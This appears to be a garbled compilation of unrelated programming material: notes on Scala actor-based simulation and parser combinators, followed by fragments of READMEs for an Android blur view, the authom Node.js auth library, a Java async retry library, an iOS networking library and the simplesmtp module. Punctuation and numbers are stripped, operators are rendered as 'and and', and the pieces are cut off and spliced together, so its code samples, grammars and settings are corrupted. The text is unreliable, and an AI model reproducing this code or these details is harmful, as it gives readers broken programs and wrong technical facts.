simulation code from chapter  changed so that events run in parallel the key idea is to make each simulated object an actor it is likely that there will be some common behavior between different simulated objects so it makes sense to define a trait that can be mixed in any class to make it a simulated object trait simulant extends actor class wire extends simulant we must decide how to make the simulation participants synchronized with the simulated time e g participant a should not race ahead and process an event at time tick  until all other actors have finished with time tick  we ll make such that no simulant should process events for time n until all other simulants are finished with time n  but how does a simulant know when it s safe to move forward we ll use a clock actor that will keep track of the current time and tell simulants when it s time to move forward to keep the clock from moving forward before all simulants are ready the clock will ping actors at carefully chosen time to make sure they have received and processed all messages for the current time tick clock will send ping and simulants will respond with pong message stating they are ready for the clock to move forward case class ping time int and and sender is always the clock case class pong time int from actor and and time and from add redundancy simulants should not respond to a ping until they have finished all the work for that tick but how do they know their work is done we ll add two more constraints first that simulants never send each other messages directly but only schedule events on one another using simulation agenda second they never post events for the current time tick only for times at least one tick into the future there will be a single agenda of work items which will be held by the clock actor that way the clock can wait to send out pings until it has sent out requests for all work items of the current tick actors then know that whenever they receive a ping  they have already received from the clock all work items that need to happen at the current tick thus it s safe that when an actor receives a ping to immediately send back a pong  because no more work will be arriving during the current tick class clock extends actor private var running false private var currenttime  private var agenda list workitem list the final design issue is how a simulation is set up to begin with a natural approach is to create the simulation with the clock stopped add all the simulants connect them all together and then start the clock how do we know when the simulation is fully assembled so we can start the clock we ll avoid sending messages to actors while setting the simulation up the resulting code pattern will be that we use regular method calls to set up simulation and actor messages while the simulation is running and and workitem will be designed slightly differently than in chapter  case class workitem time int msg any target actor and and action

start clock start occasionally you may need to process a small special purpose language e g read configuration files and make them easier to modify by hand than xml or e g you want to support an input language in your program such as search terms with boolean operators whatever the reason because you need to convert the input language into some data structure your software can process you re going to need a parser instead of using a standalone domain specific language we ll use an internal dsl which will consist of a library of parser combinators  i e functions and operators defined in scala that will server as building blocks for parser which will map one to one to the constructions of a context free grammar to make them easy to understand if you wanted to construct a parser for arithmetic expressions consisting of floating point numbers parentheses and the binary operators and   and and  the first step would be to write down a grammar for the language to be parsed expr term and term and term term factor factor and and factor factor floatingpointnumber and expr and and and denotes alternative productions and denote repetition zero or more times and and denote an optional occurrence not mentioned in grammar above every expression is a term which can be followed by a sequence of and or operators and further terms a term is a factor possibly followed by a sequence of or and operators and further factors a factor is either a numeric literal or an expression in parentheses and and actual code of arith class that consists of  parsers specified above in grammar import scala util parsing combinator  class arith extends javatokenparsers def expr parser any term rep and term and term def term parser any factor rep factor and and factor def factor parser any floatingpointnumber and expr and and javatokenparsers is a trait that provides basics for writing a parser and also and and provides some primitive parsers that recognize some word classes identifiers string and and literals and numbers and and floatingpointnumber is a primitive parser inherited from the trait in order to translate grammar into source code every production becomes a method so you need to prefix it with def the result type of each method is parser any so you need to change to parser any insert explicit operator between every two consecutive symbols repetition is expressed with rep instead of option is opt instead of the period at the end of each production is omitted use a semicolon if you want you can exercise the parser with the following small program object parseexpr extends arith def main args array string val arg   and  println input and arg println parseall expr arg and and parseall expr input applies the parser expr to the given input and and there s also a method parse  which parses an input prefix and and input   and  and and   parsed  list  list list and  list list and and the output tells you that parser successfully analyzed the input string up to and and position    first row th column the whole input string and and trying to parse an illegal expression val arg   and  and and input   and  and and   failure string matching regex z expected but found floatingpointnumber parser recognizes a floating point number in the java format if you need to parse numbers in a format that s different from java s you can use a regular expression parser you can use any regular expression as a parser it parses all strings it matches its result is the parsed string e g and and regex that describes all java identifiers object myparsers extends regexparsers and and trait val ident parser string a za z w r scala s parsing combinators are arranged in a hierarchy of traits which are all contained in package scala util parsing combinator the top level trait is parsers  which defines a very general parsing framework one level bellow is trait regexparsers  which requires that the input is a sequence of characters and provides a framework for regex parsing more specialized is trait javatokenparsers  which implements parsers for basic classes of tokens as they are defined in java and and the grammar that describes the syntax of json value obj and arr and stringliteral and floatingpointnumber and null and true and false obj members arr values members member  member member stringliteral value values value  value value an object array string number or one of reserved words null true false object possibly empty sequence of members separated by commas and enclosed in braces member a string value pair where string and value are separated by colon array a sequence of values separated by commas enclosed in square brackets and and grammar translated to source code import scala util parsing combinator  class json extends javatokenparsers def value parser any obj and arr and stringliteral and floatingpointnumber and null and true and false def obj parser any repsep member  def arr parser any repsep value  def member parser any stringliteral value and and repsep combinator that parses a possibly empty sequence of terms separated by and and a given separator string and and we ll read from a file import java io filereader object parsejson extends json def main args array string val reader new filereader args  and and parseall is overloaded takes sequence or input reader as a second argument println parseall value reader and and example json in a file address book name john smith  address street  market street  city san francisco ca  zip  phone numbers        and and output and and   parsed list address book list name john smith  and and address list street  market street  city and and san francisco ca  zip   phone numbers list and and        in order to customize the parser output we first need to know what the individual parsers and combinator frameworks return as a result each parser written as a string returns the parsed string itself regex parsers also return parsed string a sequential composition p q returns the results of both p and q in an instance of a case class that is also written as so if p returns true and q returns  then p q returns true   which prints as true an alternative composition p and q returns the result of either p or q whichever one succeeds the repetition rep p or repsep p separator returns a list of the results of all runs of p an option opt p returns an instance of option type thus returning some r if p succeeds with result r or none if p fails a better output of the json parser would be to map a json object into an internal scala representation json object is represented as a map of type map string any json array is represented as a list of type list any json string is represented as scala string json numeric literal is represented as a double values true  false and null are represented as corresponding scala values to produce this representation you need to make use of one more combination form for parsers operator which transforms the result of a parser in p f  where p is a parser and f is a function whenever p returns with some result r  the result of p f is f r and and parser that parses floating point number and converts it to double floatingpointnumber  todouble and and parser that parses the string true and returns scala s boolean true value true x true and and a new version of a json parser that returns a map def obj parser map string any and and may be improved repsep member  case ms map and and ms and and as we mentioned the operator produces an instance of a case class with that name and and here s the definition of that class which is an inner class of trait parsers case class and a and b x a y b override def tostring and x and and y and and and since the name of the class is the same as the name of the sequence combinator method and and we can match parser results with patterns that follow the same structure as the and and parsers themselves and and e g the pattern ms matches a result string followed by a result variable and and ms  which is followed by a result string and and the purpose of the ms pattern is to strip off the braces so that you can get and and at the list of members resulting from the repsep member  parser in cases like the previous code there is also an alternative that avoids producing unnecessary parser results that are immediately discarded by the pattern match the alternative makes use of and parser combinators which express sequential composition like  but keeps only the result of its right operand whereas keeps only the result of its left operand using these combinators the json parser can be expressed more succinctly def obj parser map string any repsep member  map and and  and and final version of json parser class json extends javatokenparsers def obj parser map string any repsep member

combinators in the above table use symbolic names which has its advantages symbolic names are short and can be chosen to have the right precedences and associativities and disadvantages symbolic names take time to learn turning off semicolon inference note that the body of the value parser in the example above is enclosed in parentheses this is a little trick to disable semicolon inference in parser expressions semicolons are inserted between any two lines that can be separate statements syntactically unless the first line ends in an infix operator or the two lines are enclosed in parentheses or square brackets and and we could have written value like this def value parser any stringliteral and and and and then semicolon insertion would have worked correctly and and but most developers prefer to see the and operator at the beginning of the second and and alternative rather than the end of the first which would lead to incorrect and and semicolon insertion obj and and semicolon implicitly inserted guidelines for choosing between symbolic and alphabetic names use symbolic names in cases where they already have a universally established meaning for example nobody would recommend writing add instead of and for addition otherwise give preference to alphabetic names if you want your code to be understandable to casual readers you can still choose symbolic names for dsl libraries if this gives clear advantage in legibility and you don t expect anyway that a casual reader without a firm grounding in the domain would be able to understand the code immediately the core of scala s combinator parsing framework is contained in the trait scala util parsing combinator parsers this trait defines the parser type as well as all fundamental combinators a parser is in essence just a function from some input type to a parse result as a first approximation the type could be written like this type parser t input parseresult t parser input sometimes a parser reads a stream of tokens instead of a raw sequence of characters then a separate lexical analyzer is used to convert a stream of raw characters into a stream of tokens the type of parser inputs is defined type input reader elem the class reader comes from the package scala util parsing input and is similar to a stream  but also keeps track of the position of all the elements it reads the type elem represents individual input elements it s an abstract type member of the parsers trait type elem this means that subclasses and subtraits of parsers need to instantiate class elem to the type of input elements that are being parsed e g regexparsers and javatokenparsers fix elem to be equal to char it would also be possible to set elem to some other type such as the type of tokens returned from a separate lexer parser results a parser might either succeed or fail on some given input consequently class parseresult has two subclasses for representing success and failure sealed abstract class parseresult and t case class success t result t in input extends parseresult t case class failure t msg string in input extends parseresult nothing success carries the result returned from the parser in its result parameter the type of parser results is arbitrary that is why parseresult  success and parser are all parameterized with a type parameter t  which represents the kinds of results returned by a given parser success also takes a second parameter in  which refers to the input immediately following the part that the parser consumed this field is needed for chaining parsers so that one parser can operate on result of another note that this is purely functional approach to parsing input is not read as a side effect but is kept in a stream a parser analyzes some part of the input stream and then returns the remaining part in its result the other subclass of parseresult is failure  which takes as a parameter a message that describes why the parser failed failure also takes a second parameter but it s not needed for chaining parser doesn t continue  but to position the error message at the correct place in the input stream parse results are defined to be covariant in the type parameter t  i e a parser returning string as result is compatible with a parser returning anyref the parser class parser is in reality a class that inherits from the function type input parseresult t and additionally defines methods abstract class parser and t extends input parseresult t and and unspecified method that defines the behavior of this parser def apply in input parseresult t def and and def and and and and and since parsers inherit from functions they need to define apply method the abstract apply method in class parser needs to be implemented in the individual parsers that inherit from parser aliasing this  the body of the parser class starts with abstract class parser and t extends p and and alias a clause such as id immediately after the opening brace of a class template defines the identifier id as an alias for this inside the class it s as if we had written val id this in the class body except that the compiler knows that id is an alias for this so id m is completely equivalent to this m  except that the first expression would not compile if id was just defined as a val  because then the compiler would treat id as a normal identifier aliasing can also be a good abbreviation when you need to access this of an outer class class outer outer class inner println outer this eq outer and and true and and in java you d use outer this and and in scala we use alias outer single token parsers trait parsers defines a generic parser elem that can be used to parse any single token def elem kind string p elem boolean new parser elem def apply in input if p in first success in first in rest else failure kind and expected  in and and kind describes what kind of token should be parsed and and p a predicate on elems  which indicates whether an element fits the class and and of tokens to be parsed and and when applying the parser elem kind p to some input in  the first element of the and and input stream is tested with predicate if p returns true  the parser succeeds and and its result is the element itself and its remaining input is the input stream starting and and just after the element that was parsed and and if p returns false  the parser fails with an error message that indicates what and and kind of token was expected sequential composition the elem parser only consumes a single element to parse more interesting phrases you can string parsers together with the sequential composition operator p q applies first the parser p to a given input string and then if p succeeds the q parser is applied to the input that s left after p did its job is implemented as a method in class parser and and method abstract class parser and t and and p def u q parser u new parser t u def apply in input p in

failure  case failure failure inside parser class p is specified by p part as an alias of this  so p designates the left operand or receiver of its right operand is represented by parameter q the parser s result is a object containing both the result of p i e x and the result of q i e y if either p or q fails the result of p q is the failure object returned by p or q the result type of is a parser that returns an instance of the case class with elements of types t and u the type expression t u is just a more legible shorthand for the parameterized type t u generally scala always interprets a binary type operation such as a op b as the parameterized type op a b  which is analogous to the situation for patterns where a binary pattern p op q is also interpreted as an application i e op p q the other two sequential composition operators and  could be defined just like  only with some small adjustment in how the result is computed a more legible technique is to define them in terms of def u q parser u parser t p q case x y x def u q parser u parser u p q case x y y alternative composition alternative composition p and q applies either p or q to a given input it first tries p  and if it succeeds the whole parser succeeds with the result of p if p fails then q is tried on the same input as p the result of q is then the result of the whole parser and and definition of and method of class parser def and q parser t new parser t def apply in input p in match case s success   s case failure q in if p and q both fails the failure message is determined by q dealing with recursion q parameter in methods and and is by name its type is preceded by this means that the actual parser argument will be evaluated only when q is needed which should only be the case after p has run this makes possible to write recursive parsers and and a recursive parser that parses a number enclosed in arbitrarily many parentheses def parens floatingpointnumber and parens if and and took by

p rep q p case r rs r rs and success list the parsers we used so far made use of string literals and regular expressions to parse single words the support for these comes from regexparsers  a subtrait of parsers trait regexparsers extends parsers and and the regexparsers trait is more specialized than trait parsers in that it only works for inputs that are sequences of characters type elem char it defines two methods literal and regex implicit def literal s string parser string and and implicit def regex r regex parser string and and both methods have an implicit modifier so they are automatically applied whenever a string or regex is given in a place where a parser is expected this is why we can write string literals and regexes directly in a grammar without having to wrap them with one of these methods e g the parser expr will be automatically expanded to literal expr literal the regexparsers trait also takes care of handling white space between symbols by calling a method named handlewhitespace before running a literal or regex parser handlewhitespace method skips the longest input sequence that conforms to the whitespace regular expression which is defined like this protected val whitespace s and r and and you can override it if you want to treat whitespace differently and and e g if you want white space not to be skipped at all object myparsers extends regexparsers override val whitespace r syntax analysis is often split in two phases the lexer phase recognizes individual words in the input and classifies them into some token classes this phase is also called lexical analysis it is followed by a syntactical analysis phase that analyzes sequences of tokens the parsers trait can be used for either phase because its input elements are of the abstract type elem for lexical analysis elem would be instantiated to char individual characters that make up a word are being parsed syntactical analyzer would instantiate elem to the type of token returned by the lexer scala s parsing combinators provide several utility classes for lexical and syntactical analysis these are contained in two sub packages scala util parsing combinator lexical scala util parsing combinator syntactical if you want to split your parser into a separate lexer and syntactical analyzer you should consult the scaladoc for these packages for simple pairs the regex expression based approach shown previously is usually sufficient how does the parser issue an error message one problem is that when a parser rejects some input it generally has encountered many different failures each alternative parse must have failed possibly recursively at each choice point how to decide which of these should be emitted to the user scala s parsing library implements a simple heuristic among all failures the one that occurred at the latest position in the input is chosen i e the parser picks the longest prefix that is still valid and issues an error message that describes why parsing the prefix could not be continued further if there are several failure points at that latest position the one that was visited last is chosen and and consider running the json parser on a faulty address book which starts with name john and and the longest legal prefix of this phrase is name  so the json parser will flag and and the word john as an error and and the json parser expects a value at this point but john is an identifier and and   failure false expected but identifier john found and and name john and and and and the message stated that false was expected this comes from the fact that false and and is the last alternative of the production for value in the json grammar and and a better error message can be produced by adding a catch all failure point def value parser any obj and arr and stringlit and floatingpointnumber and null and true and false and failure illegal start of value and and this addition does not change the set of valid inputs it only improves error msg the implementation of the last possible scheme of error reporting uses a field named lastfailure in parsers trait to mark the failure that occurred at the latest position in the input var lastfailure option failure none and and the field is initialized to none it s updated in the constructor of class failure case class failure msg string in input extends parseresult nothing if lastfailure isdefined lastfailure get in pos in pos lastfailure some this and and the field is read by the phrase method implemented in the parsers trait  and and which emits the final error message if the parser fails def phrase t p parser t new parser t lastfailure none def apply in input p in match case s success out in if in atend s else failure end of input expected  in case f failure lastfailure and and lastfailure is updated as a side effect of the constructor of failure and by the and and phrase method itself the phrase method runs its argument parser p and if p succeeds with a completely consumed input the success result of p is returned if p succeeds but the input is not read completely a failure with message end of input expected is returned if p fails the failure or error stored in lastfailure is returned parser combinators employ backtracking to choose between different parsers in expression p and q  if p fails then q is run on the same input as p this happens even if p has parsed some tokens before failing in this case the same tokens will be parsed again by q backtracking imposes only a few restrictions on how to formulate a grammar so that it can be parsed you just need to avoid left recursive productions such as expr expr and term and term and and this always fails because expr immediately calls itself and thus never progresses and and any further backtracking is potentially costly because the same input can be parsed several times consider for instance expr term and expr and term and and what happens if the expr parser is applied to an input such as  and   and and the first alternative would be tried and would fail when matching the and sign and and then the second alternative would be tried on the same term and it would succeed and and the point is that the term ended up being parsed twice and and it s often possible to modify the grammar to avoid backtracking e g in the case of and and arithmetic expressions either one of the following productions would work expr term and expr expr term and term many languages admit so called ll  grammars when a combinator parser is formed from such a grammar it will never backtrack i e the input position will never be reset to the earlier value the combinator parsing framework allows you to express the expectation that a grammar is ll   explicitly using a new operator this operator is like sequential composition but it will never backtrack to input elements that have already been parsed using this operator the productions in the arithmetic expression parser could alternatively be written as def expr parser any term rep and term and term def term parser any factor rep factor and and factor def factor parser any expr and floatingpointnumber

imageviews are added dynamically from the code you can control max blur radius and number of blur steps remember that adding too many imageview might affect performance in order to reduce memory consumption images are downscaled before blurring you can control this downscaling with one of the parameters to properly use the selected duration and interpolator you should play expend and collapse animation on appbarlayout at least once before trying to open gallery by touching you should call appbarlayout setexpanded true true by default appbarlayout is expanded so call function with first

and connect everyauth aims for a much more ambitious integration but at the expense of locking you into a particular stack authom takes a more unix approach since it doesn t handle logins persistence sessions or anything past authentication it is more of a tool and less of a framework authom uses native node js conventions such as eventemitters and objects while everyauth uses promises and a chaining config api this is of course subjective but the authom api aims to be closer to the apis of node js itself creates an eventemitter for the given authentication service the service is specified by the service key of the options object with all other keys differing based on the service for example github would be called like this javascript var github authom createserver service github  id edbabd  secret ebdcdbfaefecccac  scope gist an optional name member can also be passed to override that used for authom path matching so if you had two github apps you could set them as name github and name github  so that they could be accessed as and auth and github and and auth and github you can listen for auth and error events by listening to a specific service for service specific events or listening to authom for all service events for example use this to listen for events from github based on the code above javascript github on auth  function req res githubspecificdata github on error  function req res githubspecificdata or use this to listen to events from all provders since authom already listens and namespaces them for you javascript authom on auth  function req res data authom on error  function req res data listens for successful authentications across all services the listener is called with the original request and response objects as well as a service specific user object which contains the following keys token the token resulting from authentication refreshtoken the refreshtoken resulting from authentication if implemented by auth service otherwise undefined id the id of the user on the remote service data the original data returned from the service and service the name of the service given so that you can branch your code javascript authom on auth  function req res data switch data service case github case google listens for failed authentications across all services like the auth event the listener is called with the original request and response objects as well as an error object allowing you to provide your own session scheme listens to an existing http s server for request events like socket io s listen method authom will intercept any request whose path starts with and auth a standard node js listener this can be used for more control over the path at which authom is used for example the following two are equivalent javascript and and socket io style var server require http createserver  authom require authom server on request  function and your usual server logic and authom listen server server listen  javascript and and route style var server require http createserver  authom require authom server on request  function req res if req url slice  and auth authom listener req res and your usual server logic and server listen  authom compliant services can be registered using this method this is useful for adding custom authentication services not suited to be part of the and lib core services for example a business specific in house authentication service custom services will override existing services of the same name  javascript var authom require authom  eventemitter require events eventemitter and and custom authentication service var ipauth function options var server new eventemitter var whitelist options whitelist and and       server on request  function req res if

11551617, when you have a piece of code that often fails and must be retried this java  and  library provides rich and unobtrusive api with fast and scalable solution to this problem scheduledexecutorservice scheduler executors newsinglethreadscheduledexecutor retryexecutor executor new asyncretryexecutor scheduler retryon socketexception class withexponentialbackoff   and and ms times  after each retry withmaxdelay  and and  seconds withuniformjitter and and add between and and  ms randomly withmaxretries  you can now run arbitrary block of code and the library will retry it for you in case it throws socketexception final completablefuture socket future executor getwithretry new socket localhost   future thenaccept socket system out println connected and socket please look carefully getwithretry does not block it returns completablefuture immediately and invokes given function asynchronously you can listen for that future or even for multiple futures at once and do other work in the meantime so what this code does is trying to connect to localhost  and if it fails with socketexception it will retry after  milliseconds with some random jitter  doubling delay after each retry but not above  seconds equivalent but more concise syntax executor getwithretry new socket localhost   thenaccept socket system out println connected and socket this is a sample output that you might expect trace and retry  failed after ms scheduled next retry in ms sun jul     cest  java net connectexception connection refused at java net plainsocketimpl socketconnect native method na    ea and and trace and retry  failed after ms scheduled next retry in ms sun jul     cest  java net connectexception connection refused at java net plainsocketimpl socketconnect native method na    ea and and trace and retry  failed after ms scheduled next retry in ms sun jul     cest  java net connectexception connection refused at java net plainsocketimpl socketconnect native method na    ea and and trace and successful after  retries took ms and returned socket addr localhost and    port localport  connected socket addr localhost and    port localport  imagine you connect to two different systems one is slow  second unreliable and fails often completablefuture string stringfuture executor getwithretry ctx unreliable completablefuture integer intfuture executor getwithretry ctx slow stringfuture thenacceptboth intfuture string s integer i and and both done after some retries thenacceptboth callback is executed asynchronously when both slow and unreliable systems finally reply without any failure similarly using completablefuture accepteither you can call two or more unreliable servers asynchronously at the same time and be notified when the first one succeeds after some number of retries i can t emphasize this enough retries are executed asynchronously and effectively use thread pool rather than sleeping blindly public interface retryexecutor completablefuture void dowithretry retryrunnable action v completablefuture v getwithretry callable v task v completablefuture v getwithretry retrycallable v task v completablefuture v getfuturewithretry retrycallable completablefuture v task if you need blocking result after all just call get on future object the api is very simple you provide a block of code and the library will run it multiple times until it returns normally rather than throwing an exception it may also put configurable delays between retries retryexecutor executor and and see creating an instance of retryexecutor below executor getwithretry new socket localhost   executor getwithretry ctx new socket localhost   and ctx getretrycount thenaccept system out println this code is more clever than it looks during first execution ctx getretrycount returns   therefore we try to connect to localhost  if this fails next retry will try localhost   and  and so on and if you realize that all of this happens asynchronously you can scan ports of several machines and be notified about first responding port on each host arrays aslist host one  host two  host three stream foreach host executor getwithretry ctx new socket host  and ctx getretrycount thenaccept system out println for each host retryexecutor will attempt to connect to port  and retry with higher ports getfuturewithretry requires special attention i you want to retry method that already returns completablefuture v e g result of asynchronous http call private completablefuture string asynchttp url url and and final completablefuture completablefuture string response executor getwithretry ctx passing asynchttp to getwithretry will yield completablefuture completablefuture v not only it s awkward to work with but also broken the library will barely call asynchttp and retry only if it fails but not if returned completablefuture string fails the solution is simple final completablefuture string response executor getfuturewithretry ctx in this case retryexecutor will understand that whatever was returned from asynchttp is actually just a future and will asynchronously wait for result or failure speaking of which in some cases despite retrying retryexecutor will fail to obtain successful result in general there are three possible outcomes of returned completablefuture  successful possibly after some number of retries when our function eventually returns rather than throws  exceptional due to excessive retries if you configure finite number of retries retryexecutor will eventually give up in that case future is completed exceptionally providing last encountered exception  exceptional due to exception that should not be retried see e g aborton and abortif just as above last encountered exception completes future executor getwithretry new socket localhost   whencomplete socket error if socket null and and connected ok proceed else log error can t connect last error  error by default retryexecutor repeats user task infinitely on every throwable and adds  second delay between retry attempts scheduledexecutorservice scheduler executors newsinglethreadscheduledexecutor retryexecutor executor new asyncretryexecutor scheduler scheduler shutdownnow notice that the asyncretryexecutor does not take care of shutting down the scheduledexecutorservice this is a conscious design decision which will be explained later asyncretryexecutor has few other constructors but most of the time altering the behaviour of this class is most convenient with calling chained with methods you will see plenty of examples written this way later on we will simply use executor reference without defining it assume it s of retryexecutor type executor retryon optimisticlockexception class withnodelay getwithretry ctx dao optimistic where dao optimistic may throw optimisticlockexception in that case you probably don t want any delay between retries more on that later if you don t like the default of retrying on every throwable  just restrict that using retryon executor retryon exception class of course the opposite might also be desired to abort retrying and fail immediately in case of certain exception being thrown rather than retrying it s that simple executor aborton nullpointerexception class aborton illegalargumentexception class getwithretry ctx dao optimistic clearly you don t want to retry nullpointerexception or illegalargumentexception as they indicate programming bug rather than transient failure and finally you can combine both retry and abort policies user code will retry in case of any retryon exception or subclass unless it should aborton specified exception for example we want to retry every ioexception or sqlexception but abort if filenotfoundexception or java sql datatruncation is encountered order of declarations is irrelevant executor retryon ioexception class aborton filenotfoundexception class retryon sqlexception class aborton datatruncation class getwithretry ctx dao load  if this is not enough you can provide custom predicate that will be invoked on each failure executor abortif throwable throwable instanceof sqlexception throwable getmessage contains ora  retryif t t getcause null if any of abortif or retryif predicates return true task is aborted or retried respectively keep in mind that abortif and retryif take priority over aborton and retryon thus the following piece of code will retry on filenotfoundexception access denied executor aborton filenotfoundexception class aborton nullpointerexception class retryif e e getmessage contains denied if more than one abortif predicate passes as well as more than one retryif predicate then computation is aborted another way of interrupting retrying loop remember that this process is asynchronous there is no blocking loop is by specifying maximum number of retries executor withmaxretries  in rare cases you may want to disable retries and barely take advantage from asynchronous execution in that case try executor dontretry max number of retries takes precedence over on and if family of methods retrying immediately after failure is sometimes desired see optimisticlockexception example but in most cases it s a bad idea if you can t connect to external system waiting a little bit before next attempt sounds reasonably you save cpu bandwidth and other server s resources but there are quite a few options to consider should there be a lower and upper limit on waiting time should we add random jitter to delay times to spread retries of many tasks in time this library answers all these questions by default each retry is preceded by  second waiting time so if initial attempt fails first retry will be executed after  second of course we can change that default e g to  milliseconds executor withfixedbackoff  if we are already here by default backoff is applied after executing user task if user task itself consumes some time retries will be less frequent for example with retry delay of ms and average time it takes before user task fails at about ms retryexecutor will retry about  times per second ms and ms however if you want to keep retry frequency at more predictable level you can use fixedrate flag executor withfixedbackoff  withfixedrate it s probably an active research subject but in general you may wish to expand retry delay over time assuming that if the user task fails several times we should try less frequently for example let s say we start with ms delay until first retry attempt is made but if that one fails as well we should wait two times more ms and later ms ms you get the idea executor withexponentialbackoff   this is an exponential function that can grow very fast thus it s useful to set maximum backoff time at some reasonable level e g  seconds executor withexponentialbackoff   withmaxdelay  and and  seconds one phenomena often observed during major outages is that systems tend to synchronize imagine a busy system that suddenly stops responding hundreds or thousands of requests fail and are retried it depends on your backoff but by default all these requests will retry exactly after one second producing huge wave of traffic at one point in time finally such failures are propagated to other systems that in turn synchronize as well to avoid this problem it s useful to spread retries over time flattening the load a simple solution is to add random jitter to delay time so that not all request are scheduled for retry at the exact same time you have choice between uniform jitter random value from ms to ms executor withuniformjitter  and and ms and proportional jitter multiplying delay time by random factor by default between   and    executor withproportionaljitter   and and  you may also put hard lower limit on delay time to avoid to short retry times being scheduled executor withmindelay  and and ms there are cases when you want to run first retry immediately and fall back to configured backoff mechanism for subsequent requests you can use firstretrynodelay method withexponentialbackoff   firstretrynodelay completablefuture string future executor getwithretry this sometask with the above configuration first retry is executed immediately second retry after  ms third after  ms and so on without firstretrynodelay first retry would be delayed by  ms already but what is really interesting is that the whole library is fully immutable there is no single mutable field at all this might be counter intuitive at first take for example this trivial code sample scheduledexecutorservice scheduler executors newsinglethreadscheduledexecutor asyncretryexecutor first new asyncretryexecutor scheduler retryon exception class withexponentialbackoff   asyncretryexecutor second first aborton filenotfoundexception class asyncretryexecutor third second withmaxretries  it might seem that all with methods or retryon and aborton mutate existing executor but that s not the case each configuration change creates new instance  leaving the old one untouched so for example while first executor will retry on filenotfoundexception  the second and third won t however they all share the same scheduler this is the reason why asyncretryexecutor does not shut down scheduledexecutorservice it doesn t even have any close method since we have no idea how many copies of asyncretryexecutor exist pointing to the same scheduler we don t even try to manage its lifecycle however this is typically not a problem see spring integration below you might be wondering why such an awkward design decision there are three reasons when writing a concurrent code immutability can greatly reduce risk of multi threading bugs for example retrycontext holds number of retries but instead of mutating it we simply create new instance copy with incremented but final counter no race condition or visibility can ever occur if you are given an existing retryexecutor which is almost exactly what you want but you need one minor tweak you simply call executor with and get a fresh copy you don t have to worry about other places where the same executor was used see spring integration for further examples functional programming and immutable data structures are sexy these days n b asyncretryexecutor is not marked final  does you can break immutability by subclassing it and adding mutable state please don t do this subclassing is only permitted to alter behaviour autowired private transactiontemplate template and later in the same class final int oldtimeout template gettimeout template settimeout  and and do the work template settimeout oldtimeout this code is wrong on so many levels first of all if something fails we never restore oldtimeout ok finally to the rescue but also notice how we changed global shared transactiontemplate instance who knows how many other beans and threads are just about to use it unaware of changed configuration you see where i m going just create one immutable service class and safely adjust it by creating copies whenever you need it and using such services is equally simple these days configuration class beans public retryexecutor retryexecutor return new asyncretryexecutor scheduler retryon socketexception class withexponentialbackoff   bean destroymethod shutdownnow public scheduledexecutorservice scheduler

and nsconnection s operation queue delegate or gcd fsnconnection offers the following asynchronous http and https requests get and post urlencoded and form data easily extended for other http methods response parsing in a background thread followed by a completion block on the main thread convenient safe object retention sementics and life cycle management enabling fire and forget requests support for ios background tasks useful utilities for creating and debugging form data parsing json error checking etc clean straightforward implementation no class hierarchies to grok easily trace and

start the most important aspects of this pattern are the value returned from the parse block is assigned to the connection s parseresult property similarly if any error is set by the parse block that is assigned to the connection s error property you can write simple wrappers around this method to accommodate all the endpoints in a web api compose a url for each endpoint send standard headers such as user agent and accept language send standard parameters such as oauth token client version etc combine standard and custom handling for parse and completion steps by calling small custom blocks inside of wrapper blocks that perform uniform error checking parsing etc for example the foursquare app defines a category on fsnconnection that looks like this objective c implementation fsnconnection fs and and convenience accessor property that casts parseresult to our custom api specific type apiresult apiresult return self parseresult apiresult makeapiresultwitherror nserror error and and parse the foursquare api result json and and then check self response statuscode as well as the foursquare api result meta json dict for errors and and if everything is ok then return the an

urlencoded if any parameter is an fsndata object then the request will have the content type multipart and form data this design allows us to rapidly adjust to changing web api requirements with

two mime types are enumerated but more can be added easily just define additional enumerations and their corresponding strings in fsndata h and fsndata m other http methods like head and put are not yet supported but adding them should not be hard patches are welcome feel free to get in touch if you would like to discuss the implementation fsndemo ios shows how to set up a single connection to the foursquare api as is the connection will fail with an oauth error demonstrating the error handling conventions fsndemo mac shows how to make the exact same connection but from the command line running an asynchronous connection requires the program to run the main runloop manually fsn is released under the apache license version   see license txt more information can be found here the current release is   this code has been in production in the foursquare app for many moons support for nsurlconnection s setdelegatequeue exists but is disabled by default because it causes ios  applications to deadlock instead fsn uses the main thread for connection callbacks and gcd to perform parsing on a background thread define fsnqueuedconnections to  typically in your prefix header to use delegate queues since delegate queues appear to work in lion the mac demo does use delegate queues however this has been tested only minimally if you enable this and find bugs please submit patches see also an nsrecursivelock is used to guard the parseblock against cancellation and deallocation while in concurrent usage we would prefer a lock free implementation for the sake of simplicity and we welcome any scrutiny or suggestions for a better solution fsnetworking depends only on cocoa s foundation framework convenience methods using uikit are guarded appropriately we currently build against ios   with the latest public release of the xcode toolset the mac demo builds against os x   fsnconnection was initially developed by foursquare labs as a replacement for

3226512, simplesmtp is a module written for node v  and slightly updated for node v  it does not use node v  streams and probably is going to have a rocky future with node v  i do not have time to keep it up to date the thing probably needs a major rewrite for node v  should be fine though for integration testing purposes this is a module to easily create custom smtp servers and clients use smtp as a first class protocol in node js if you are using node v  then the last usable version of simplesmtp is v   current version of simplesmtp is fully supported for node v  and  smtp server for a simple inbound only no authentication smtp server you can use simplesmtp createsimpleserver options  requestlistener listen port simplesmtp createsimpleserver smtpbanner my server  function req req

idle the connection to the smtp server has been successfully set up and the client is waiting for an envelope message the envelope is passed successfully to the server and a message stream can be started ready success the message was sent rcptfailed addresses not all recipients were accepted invalid addresses are included as an array error err stage an error occurred the connection is closed and an end event is emitted shortly second argument indicates on which smtp session stage an error occured end connection to the client is closed when an idle event is emitted an envelope object can

delivery client once idle  function client useenvelope from me example com  to receiver example com  receiver example com  the to part of the envelope includes all recipients from to  cc and bcc fields if setting the envelope up fails an error is emitted if only some not all recipients are not accepted the mail can still be sent but an rcptfailed event is emitted client on rcptfailed  function addresses console log the following addresses were rejected  addresses if the envelope is set up correctly a message event is emitted when message event is emitted it is possible to send mail to do this you can pipe directly a message source for example an eml file to the client or alternatively you can send the message with client write calls you also need to call client end once the message is completed if you are piping a stream to the client do not leave the end event out this is needed to complete the message sequence by the client client on message  function fs createreadstream test eml pipe client once the message is delivered a ready event is emitted the event has an parameter which indicates if the message was transmitted true or not false and another

you can set xoauth param as an auth option var mailoptions  auth xoauth user example user gmail com  clientid  apps googleusercontent com  clientsecret clientsecret  refreshtoken  and

